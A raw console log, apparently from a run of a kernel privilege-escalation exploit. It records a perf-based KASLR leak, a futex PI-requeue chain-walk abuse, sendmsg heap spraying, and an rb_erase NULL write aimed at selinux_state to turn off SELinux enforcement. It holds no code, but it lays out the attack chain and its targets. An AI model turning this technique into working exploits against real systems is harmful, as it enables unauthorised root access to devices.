[main] g_iov_idx=2 (override with IOV_IDX=k)  spray=sendmsg
[kaslr] perf text-base=ffffffe64a800000 min_kip=ffffffe64a8a20a0 samples=16
[kaslr] base=0xffffffe64a800000 slide=0x2642800000
  init_task   = 0xffffffe655443640
  selinux_state = 0xffffffe6555a9d78 (enforcing @ +0)
  fake_lock   = 0xffffffe6555ca880 (uid_lock+0x200, ZEROED BSS rt_mutex)
  fake_lock2  = 0xffffffe6555ca980 (uid_lock+0x300, ZEROED BSS rt_mutex)
[Y] tid=12037
[X] tid=12038
[main] topology ready; FUTEX_CMP_REQUEUE_PI(cond) -> cycle
[main] CMP_REQUEUE_PI returned -35 (Resource deadlock would occur)
[main] -EDEADLK: full chainwalk caught PI cycle
[Y] PHASE1 spray: settle ghost (d=2 method=sendmsg: li=5 parent@iov0..4)
[Y] SPRAY-DEBUG iovstack base=0x274060  &iov[4]=0x2740a0  method=sendmsg
[Z] tid=12039
[Z] FUTEX_LOCK_PI(L2): walk into pi_blocked_on
[do_2] Z blocked on L2 — chain walk survived
[phase1] sched_setscheduler(Y) -> rb_erase NULL write to root (settle)
[phase1] chain walk OK (kernel alive)
[phase2] request re-spray (parent=selinux-8, lock=fake_lock2 @ uid_lock+0x300)
[Y] PHASE2 spray: d=2 li=5 parent=selinux-8 children=0 lock=fake_lock2
[phase2] sched_setscheduler(Y) -> rb_erase NULL write to selinux
